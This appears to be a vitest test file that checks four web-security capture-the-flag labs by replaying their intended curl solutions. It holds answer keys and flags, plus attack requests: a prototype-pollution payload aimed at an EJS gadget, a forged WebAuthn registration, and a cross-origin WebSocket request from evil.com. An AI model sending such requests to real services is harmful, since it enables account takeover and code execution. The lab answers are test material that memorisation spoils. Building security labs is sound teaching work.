import { describe, it, expect } from 'vitest'
import fs from 'node:fs'
import path from 'node:path'
import { createSession } from './session'

// End-to-end solvability check for lab batch web-b9.
const dir = path.resolve(process.cwd(), '../content/labs')
const WD = '/home/student/task'
const CHECK = "grep -q 'nto{' found.txt"

function load(id) {
  return JSON.parse(fs.readFileSync(path.join(dir, `${id}.json`), 'utf8'))
}

const LABS = [
  {
    id: "web-prototype-pollution-rce", flag: "nto{pp_g4dg3t_ejs_outputfunctionname_rce}", hints: 4,
    solution: ["curl -s -X POST https://docs.example/api/merge -H 'Content-Type: application/json' -d '{\"__proto__\":{\"outputFunctionName\":\"x;s\"}}'", "curl -s 'https://docs.example/render?page=about' > found.txt"],
  },
  {
    id: "web-webauthn", flag: "nto{w3bauthn_0r1g1n_ch4ll3ng3_uv_n0t_v3r1f13d}", hints: 4,
    solution: ["curl -s -X POST https://id.local/webauthn/register/finish -b 'session=MY_SESSION' -d 'user.id=dXNlcl92aWN0aW0' > found.txt"],
  },
  {
    id: "web-websocket-smuggling", flag: "nto{cswsh_101_w1th_f0r31gn_0r1g1n}", hints: 4,
    solution: ["curl -s -i -H 'Connection: Upgrade' -H 'Upgrade: websocket' -H 'Origin: https://evil.com' https://target.local/chat > found.txt"],
  },
  {
    id: "web-xs-leaks", flag: "nto{c4ch3_pr0b1ng_l34ks_l0g1n_st4t3}", hints: 4,
    solution: ["curl -s https://target.local/account -b 'session=me' > found.txt"],
  },
]

describe.each(LABS)('lab batch web-b9: $id', ({ id, flag, hints, solution }) => {
  const bundle = load(id)
  const spec = { kind: 'shell', workdir: WD, check: CHECK, hints: Array(hints).fill('h') }

  it('bundle + seed files are consistent with the lesson lab block', () => {
    expect(bundle.id).toBe(id)
    expect(bundle.workdir).toBe(WD)
    expect(bundle.fs.some((f) => f.path === `${WD}/task.md`)).toBe(true)
    expect(bundle.expect.file).toBe(`${WD}/found.txt`)
    expect(bundle.expect.contains).toBe(flag)
  })

  it('replays the intended solution and passes check', async () => {
    const s = createSession({ spec, bundle })
    expect((await s.run('check')).code).toBe(1)
    for (const cmd of solution) await s.run(cmd)
    expect((await s.run('check')).code).toBe(0)
  })
})
